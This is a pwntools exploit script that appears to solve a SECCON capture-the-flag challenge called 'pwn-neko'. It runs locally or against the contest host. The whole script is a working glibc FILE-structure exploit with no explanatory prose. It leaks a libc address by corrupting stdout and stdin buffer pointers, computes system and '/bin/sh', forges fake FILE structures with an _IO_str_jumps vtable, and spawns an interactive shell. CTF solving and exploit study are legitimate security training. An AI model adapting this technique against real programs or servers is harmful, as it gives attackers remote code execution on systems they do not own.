from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './chall'
HOST = 'pwn-neko.chal.seccon.jp'
PORT = 9003

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)
    # return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()

# null stdout.write_base & 0xff 
r.sendlineafter('> ', '1')
r.sendlineafter(': ', str(0x300000))
r.sendlineafter(': ', str(0x301000+0x3ec780+1-0x10))
r.sendlineafter(': ', 'hoge')

# null stdout.read_end & 0xff (blind)
sleep(0.1)
r.sendline('1')
sleep(0.1)
r.sendline(str(0x300000))
sleep(0.1)
r.sendline(str(0x301000*2+0x3ec780+1-0x10-0x10))
sleep(0.1)
r.sendline('')

# leak
r.recv(8)
leak = u64(r.recv(8))
dbg('leak')
base = leak - 0x3ed8b0
dbg('base')
system = base + 0x4f4e0
binsh = base + 0x1b40fa
io_str_jumps = base + 0x3e8370
stdin = base + 0x3eba00
stdout = base + 0x3ec760
stdout_lock = base + 0x3ed8c0
stdin_buf = base + 0x3eba84
stdin_lock = base + 0x3ed8d0

# null stdin.buf_base & 0xff
r.sendlineafter('> ', '1')
r.sendlineafter(': ', str(0x300000))
r.sendlineafter(': ', str(0x301000*3 + stdin - base + 0x28 + 1))
r.sendlineafter(': ', 'hoge')
# pause()
if args.D:
    # debug(r, [0xb0d, 0xbb3])
    debug(r, [0xa57])
    # debug(r, [])
pause()
payload = ''
payload += p64(0xfbad208b)
payload += p64(stdin_buf)
payload += p64(0) * 5
payload += p64(stdout)
payload += p64(stdout+0x100)
payload += p64(0)*4

r.sendlineafter('> ', payload)
sleep(0.1)
payload = ''
payload += p64(0)*4
payload += p64(1)
payload += p64(0)*3
payload += p64(binsh/2-50)
payload += p64(0)*8
payload += p64(stdout_lock)
payload += p64(0)*3
payload += p64(0)*6
payload += p64(io_str_jumps-0x10)
payload += p64(system)
payload += p64(stdout)
payload += p64(stdin)

r.sendline(payload)


r.interactive()
r.close()
